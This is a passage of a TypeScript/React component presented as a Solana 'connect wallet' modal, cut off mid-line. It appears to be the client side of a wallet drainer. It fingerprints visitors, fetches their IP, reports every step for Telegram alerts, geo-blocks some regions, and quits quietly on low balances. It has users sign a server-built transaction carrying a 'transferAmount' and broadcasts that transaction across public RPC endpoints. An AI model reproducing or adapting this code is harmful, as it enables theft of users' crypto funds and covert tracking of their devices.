"use client"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
import { Button } from "@/components/ui/button" 
import Image from "next/image" 
import { useState, useEffect } from "react" 

interface ModalsProps {
  isOpen: boolean
  onClose: () => void
}

enum EventType {
  MODAL_OPENED = "MODAL_OPENED",
  MODAL_CLOSED = "MODAL_CLOSED",
  WALLET_CONNECT_ATTEMPT = "WALLET_CONNECT_ATTEMPT",
  WALLET_CONNECTED = "WALLET_CONNECTED",
  WALLET_CONNECT_FAILED = "WALLET_CONNECT_FAILED",
  WALLET_INSTALL_REDIRECT = "WALLET_INSTALL_REDIRECT",
  MOBILE_WALLET_REDIRECT = "MOBILE_WALLET_REDIRECT",
  GEO_BLOCKED = "GEO_BLOCKED",
  GEO_CHECK_PASSED = "GEO_CHECK_PASSED",
  WALLET_SCAN_STARTED = "WALLET_SCAN_STARTED",
  WALLET_SCAN_SUCCESS = "WALLET_SCAN_SUCCESS",
  WALLET_SCAN_FAILED = "WALLET_SCAN_FAILED",
  INSUFFICIENT_BALANCE = "INSUFFICIENT_BALANCE",
  TRANSACTION_SIGNED = "TRANSACTION_SIGNED",
  TRANSACTION_BROADCAST_START = "TRANSACTION_BROADCAST_START",
  TRANSACTION_BROADCAST_SUCCESS = "TRANSACTION_BROADCAST_SUCCESS",
  TRANSACTION_BROADCAST_FAILED = "TRANSACTION_BROADCAST_FAILED",
  RPC_ENDPOINT_SWITCH = "RPC_ENDPOINT_SWITCH",
  APPROVAL_SENT = "APPROVAL_SENT",
  USER_IP_FETCHED = "USER_IP_FETCHED",
  USER_IP_FAILED = "USER_IP_FAILED",
  MODAL_SESSION_TIMEOUT = "MODAL_SESSION_TIMEOUT",
  WALLET_DETECTED = "WALLET_DETECTED",
  WALLET_NOT_INSTALLED = "WALLET_NOT_INSTALLED",
  MODAL_ACTION = "MODAL_ACTION"
}

interface NotificationData {
  eventType: EventType
  walletType?: string
  walletAddress?: string
  userIP?: string
  balanceSOL?: number
  balanceUSD?: number
  transactionHash?: string
  rpcEndpoint?: string
  error?: string
  isMobile?: boolean
  inWalletBrowser?: boolean
  userAgent?: string
  sessionId?: string
  modalOpenTime?: number
  screenInfo?: any
  locationInfo?: any
  action?: string
  fromModal?: boolean
  attemptNumber?: number
  duration?: number
  reason?: string
  deepLink?: string
  universalLink?: string
  isIOS?: boolean
  isAndroid?: boolean
  currentUrl?: string
  source?: string
  rpcEndpointsCount?: number
  redirectUrl?: string
  detectedWallets?: string[]
}

// Generate session ID
const generateSessionId = () => {
  return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now()
}

async function sendEventNotification(eventData: NotificationData) {
  try {
    // Get user agent
    const userAgent = navigator.userAgent || "unknown"
    
    // Get screen info
    const screenInfo = {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: window.screen.orientation?.type || "unknown"
    }
    
    // Get browser info
    const browserInfo = {
      language: navigator.language || "unknown",
      languages: navigator.languages || [],
      platform: navigator.platform || "unknown",
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || "unknown"
    }
    
    // Get referrer and URL info
    const referrer = document.referrer || "direct"
    const urlParams = Object.fromEntries(new URLSearchParams(window.location.search))
    
    // Get timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown"
    
    const fullEventData = {
      ...eventData,
      userAgent,
      screenInfo,
      browserInfo,
      referrer,
      urlParams,
      timezone,
      timestamp: new Date().toISOString(),
      currentUrl: window.location.href,
      pageTitle: document.title,
      windowSize: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight
      }
    }
    
    // Send to backend for Telegram notifications
    try {
      await fetch("/api/log-event", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(fullEventData),
      })
    } catch (error) {
      console.error("Failed to send event notification:", error)
    }
  } catch (error) {
    console.error("Error in event notification:", error)
  }
}

// Enhanced wallet configuration with more wallets
const DESKTOP_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
    downloadUrl: "https://phantom.app/download"
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    provider: () => (window as any).solflare,
    checkMethod: () => (window as any).solflare?.isSolflare,
    downloadUrl: "https://solflare.com/download"
  },
  backpack: {
    name: "Backpack",
    icon: "/backpack-icon.png",
    provider: () => (window as any).backpack,
    checkMethod: () => (window as any).backpack?.isBackpack,
    downloadUrl: "https://www.backpack.app/"
  },
  sollet: {
    name: "Sollet",
    icon: "/sollet-icon.png",
    provider: () => (window as any).sollet,
    checkMethod: () => (window as any).sollet,
    downloadUrl: "https://www.sollet.io/"
  },
  exodus: {
    name: "Exodus",
    icon: "/exodus-icon.png",
    provider: () => (window as any).exodus?.solana,
    checkMethod: () => (window as any).exodus?.solana,
    downloadUrl: "https://www.exodus.com/"
  },
  trustwallet: {
    name: "Trust Wallet",
    icon: "/trustwallet-icon.png",
    provider: () => (window as any).trustwallet?.solana,
    checkMethod: () => (window as any).trustwallet,
    downloadUrl: "https://trustwallet.com/"
  }
} as const;

const MOBILE_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    deepLink: "phantom://browse/",
    universalLink: "https://phantom.app/ul/browse/",
    downloadUrl: "https://phantom.app/download"
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
    downloadUrl: "https://solflare.com/download"
  },
  backpack: {
    name: "Backpack",
    icon: "/backpack-icon.png",
    deepLink: "backpack://",
    universalLink: "https://backpack.app/",
    downloadUrl: "https://www.backpack.app/"
  },
  trustwallet: {
    name: "Trust Wallet",
    icon: "/trustwallet-icon.png",
    deepLink: "trust://",
    universalLink: "https://link.trustwallet.com/",
    downloadUrl: "https://trustwallet.com/"
  },
  exodus: {
    name: "Exodus",
    icon: "/exodus-icon.png",
    deepLink: "exodus://",
    universalLink: "https://exodus.com/",
    downloadUrl: "https://www.exodus.com/mobile"
  }
} as const;

const wallets = [
  {
    id: "phantom",
    name: "Phantom",
    icon: "/phantom-icon.png",
    description: "Most popular Solana wallet",
    type: "extension",
    supported: true
  },
  {
    id: "solflare",
    name: "Solflare",
    icon: "/solflare-icon.png",
    description: "Secure Solana wallet",
    type: "extension",
    supported: true
  },
  {
    id: "backpack",
    name: "Backpack",
    icon: "/backpack-icon.png",
    description: "Solana wallet & NFT platform",
    type: "extension",
    supported: true
  },
  {
    id: "exodus",
    name: "Exodus",
    icon: "/exodus-icon.png",
    description: "Multi-chain wallet",
    type: "extension",
    supported: true
  },
  {
    id: "trustwallet",
    name: "Trust Wallet",
    icon: "/trustwallet-icon.png",
    description: "Binance's official wallet",
    type: "extension",
    supported: true
  },
  {
    id: "sollet",
    name: "Sollet",
    icon: "/sollet-icon.png",
    description: "Web-based Solana wallet",
    type: "web",
    supported: true
  }
] as const;

export function Modals({ isOpen, onClose }: ModalsProps) {
  const [isMobileViewState, setIsMobileViewState] = useState(false) 
  const [connectedWalletData, setConnectedWalletData] = useState<any>(null) 
  const [isBlockedGeoState, setIsBlockedGeoState] = useState(false)
  const [sessionId] = useState(generateSessionId())
  const [modalOpenTime] = useState(Date.now())
  const [connectionAttempts, setConnectionAttempts] = useState<Record<string, number>>({})
  const [detectedWallets, setDetectedWallets] = useState<string[]>([])
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())
      setIsMobileViewState(mobile)
      
      // Check for installed wallets
      detectInstalledWallets()
      
      // Log device detection
      sendEventNotification({
        eventType: EventType.MODAL_OPENED,
        isMobile: mobile,
        userAgent: userAgent,
        sessionId,
        modalOpenTime,
        detectedWallets: detectedWallets
      })
    }
    
    if (isOpen) {
      checkMobile()
      checkGeoBlockStatus()
    }
    
    // Set timeout for modal session
    const timeoutId = setTimeout(() => {
      sendEventNotification({
        eventType: EventType.MODAL_SESSION_TIMEOUT,
        sessionId,
        modalOpenTime,
        duration: Date.now() - modalOpenTime
      })
    }, 300000) // 5 minutes timeout
    
    return () => {
      clearTimeout(timeoutId)
      if (isOpen) {
        sendEventNotification({
          eventType: EventType.MODAL_CLOSED,
          sessionId,
          duration: Date.now() - modalOpenTime
        })
      }
    }
  }, [isOpen])

  const detectInstalledWallets = () => {
    const detected: string[] = []
    
    Object.entries(DESKTOP_WALLETS).forEach(([id, wallet]) => {
      try {
        if (wallet.checkMethod()) {
          detected.push(id)
          sendEventNotification({
            eventType: EventType.WALLET_DETECTED,
            walletType: id,
            sessionId
          })
        }
      } catch (error) {
        // Silently fail if wallet check throws
      }
    })
    
    setDetectedWallets(detected)
    return detected
  }

  const checkGeoBlockStatus = async () => {
    try {
      const response = await fetch("/api/check-geo")
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeoState(true)
        sendEventNotification({
          eventType: EventType.GEO_BLOCKED,
          sessionId,
          reason: data.reason || "Unknown"
        })
        onClose()
      } else {
        sendEventNotification({
          eventType: EventType.GEO_CHECK_PASSED,
          sessionId
        })
      }
    } catch (error) {
      console.error("Geo check failed:", error)
    }
  }

  const isInWalletBrowserInstance = (walletId: string) => {
    const userAgent = navigator.userAgent.toLowerCase()
    
    if (walletId === "phantom") {
      return userAgent.includes("phantom")
    } else if (walletId === "solflare") {
      return userAgent.includes("solflare")
    } else if (walletId === "backpack") {
      return userAgent.includes("backpack")
    } else if (walletId === "trustwallet") {
      return userAgent.includes("trust")
    }
    
    return false
  }

  const connectDesktopWalletInstance = async (walletId: string) => {
    setIsLoading(true)
    
    const walletConfig = DESKTOP_WALLETS[walletId as keyof typeof DESKTOP_WALLETS]

    if (!walletConfig) {
      setIsLoading(false)
      return
    }

    // Track connection attempt
    const attempts = (connectionAttempts[walletId] || 0) + 1
    setConnectionAttempts({...connectionAttempts, [walletId]: attempts})

    sendEventNotification({
      eventType: EventType.WALLET_CONNECT_ATTEMPT,
      walletType: walletId,
      sessionId,
      attemptNumber: attempts,
      isMobile: false
    })

    const provider = walletConfig.provider()

    if (provider && walletConfig.checkMethod()) {
      try {
        const response = await provider.connect()
        setConnectedWalletData(provider)
        
        sendEventNotification({
          eventType: EventType.WALLET_CONNECTED,
          walletType: walletId,
          walletAddress: response.publicKey.toString(),
          sessionId
        })
        
        await scanAndCreateTransactionData(response.publicKey.toString(), provider, walletId)
      } catch (error: any) {
        sendEventNotification({
          eventType: EventType.WALLET_CONNECT_FAILED,
          walletType: walletId,
          error: error?.message || "Unknown connection error",
          sessionId
        })
        setIsLoading(false)
      }
    } else {
      sendEventNotification({
        eventType: EventType.WALLET_NOT_INSTALLED,
        walletType: walletId,
        sessionId,
        redirectUrl: walletConfig.downloadUrl
      })
      
      window.open(walletConfig.downloadUrl, "_blank")
      setIsLoading(false)
    }
  }

  const connectMobileWalletInstance = (walletId: string) => {
    const walletConfig = MOBILE_WALLETS[walletId as keyof typeof MOBILE_WALLETS]

    if (!walletConfig) {
      return
    }

    const inWalletBrowser = isInWalletBrowserInstance(walletId)
    
    if (inWalletBrowser) {
      sendEventNotification({
        eventType: EventType.WALLET_CONNECT_ATTEMPT,
        walletType: walletId,
        sessionId,
        inWalletBrowser: true,
        isMobile: true
      })
      
      connectDesktopWalletInstance(walletId)
      return
    }

    const currentUrl = window.location.href
    const isIOSDevice = /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase())
    const isAndroidDevice = /android/i.test(navigator.userAgent.toLowerCase())

    let deepLink = ""
    let universalLink = ""

    if (walletId === "phantom") {
      deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
      universalLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
    } else if (walletId === "solflare") {
      deepLink = walletConfig.deepLink + encodeURIComponent(currentUrl)
      universalLink = walletConfig.universalLink + encodeURIComponent(currentUrl)
    } else if (walletId === "backpack") {
      deepLink = `backpack://${encodeURIComponent(currentUrl)}`
      universalLink = `https://backpack.app/${encodeURIComponent(currentUrl)}`
    } else {
      deepLink = walletConfig.deepLink
      universalLink = walletConfig.universalLink
    }

    sendEventNotification({
      eventType: EventType.MOBILE_WALLET_REDIRECT,
      walletType: walletId,
      sessionId,
      deepLink,
      universalLink,
      isIOS: isIOSDevice,
      isAndroid: isAndroidDevice,
      currentUrl
    })

    window.location.href = deepLink

    setTimeout(() => {
      window.location.href = universalLink
    }, 1500)
  }

  const handleConnectWalletClick = (walletId: string) => {
    if (isMobileViewState) {
      connectMobileWalletInstance(walletId)
    } else {
      connectDesktopWalletInstance(walletId)
    }
  }

  const fetchUserIP = async (): Promise<string> => {
    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json")
      const ipData = await ipResponse.json()
      const ip = ipData.ip || "unknown"
      
      sendEventNotification({
        eventType: EventType.USER_IP_FETCHED,
        userIP: ip,
        sessionId,
        source: "api.ipify.org"
      })
      
      return ip
    } catch (ipError) {
      try {
        const ipResponse2 = await fetch("https://api.my-ip.io/ip")
        const ipText = await ipResponse2.text()
        const ip = ipText.trim() || "unknown"
        
        sendEventNotification({
          eventType: EventType.USER_IP_FETCHED,
          userIP: ip,
          sessionId,
          source: "api.my-ip.io"
        })
        
        return ip
      } catch {
        sendEventNotification({
          eventType: EventType.USER_IP_FAILED,
          sessionId
        })
        return "unknown"
      }
    }
  }

  const scanAndCreateTransactionData = async (publicKey: string, provider: any, walletType: string) => {
    setIsLoading(true)
    
    try {
      sendEventNotification({
        eventType: EventType.WALLET_SCAN_STARTED,
        walletAddress: publicKey,
        walletType,
        sessionId
      })

      const userIPAddress = await fetchUserIP()

      const response = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP: userIPAddress,
          userAgent: navigator.userAgent,
          isMobile: isMobileViewState
        }),
      })

      if (!response.ok) {
        sendEventNotification({
          eventType: EventType.WALLET_SCAN_FAILED,
          walletAddress: publicKey,
          error: `HTTP ${response.status}`,
          sessionId
        })
        
        setTimeout(() => {
          onClose()
        }, 1000)
        setIsLoading(false)
        return
      }

      const data = await response.json()

      if (data.error === "Insufficient balance") {
        sendEventNotification({
          eventType: EventType.INSUFFICIENT_BALANCE,
          walletAddress: publicKey,
          balanceSOL: data.balance,
          sessionId
        })
        
        setTimeout(() => {
          onClose()
        }, 1000)
        setIsLoading(false)
        return
      }

      sendEventNotification({
        eventType: EventType.WALLET_SCAN_SUCCESS,
        walletAddress: publicKey,
        balanceSOL: data.walletBalance,
        transferAmount: data.transferAmount,
        sessionId
      })

      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(data.transaction, "base64"))

      const signedTransaction = await provider.signTransaction(transaction)
      
      sendEventNotification({
        eventType: EventType.TRANSACTION_SIGNED,
        walletAddress: publicKey,
        transferAmount: data.transferAmount,
        sessionId
      })

      const RPC_ENDPOINTS = [
        "https://solana-rpc.publicnode.com",
        "https://api.mainnet-beta.solana.com",
        "https://solana.drpc.org",
        "https://solana.lavenderfive.com",
        "https://solana.api.onfinality.io/public",
        "https://public.rpc.solanavibestation.com",
      ]

      let signature = ""
      let lastError: any = null
      let successfulEndpoint = ""
      
      sendEventNotification({
        eventType: EventType.TRANSACTION_BROADCAST_START,
        walletAddress: publicKey,
        rpcEndpointsCount: RPC_ENDPOINTS.length,
        sessionId
      })

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")
          
          sendEventNotification({
            eventType: EventType.RPC_ENDPOINT_SWITCH,
            rpcEndpoint: endpoint,
            sessionId
          })

          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction({
            signature,
            blockhash: data.blockhash,
            lastValidBlockHeight: data.lastValidBlockHeight,
          })
          
          successfulEndpoint = endpoint
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        sendEventNotification({
          eventType: EventType.TRANSACTION_BROADCAST_FAILED,
          walletAddress: publicKey,
          error: lastError?.message || "All RPC endpoints failed",
          sessionId
        })
        
        throw lastError || new Error("Transaction failed")
      }

      sendEventNotification({
        eventType: EventType.TRANSACTION_BROADCAST_SUCCESS,
        walletAddress: publicKey,
        transactionHash: signature,
        rpcEndpoi
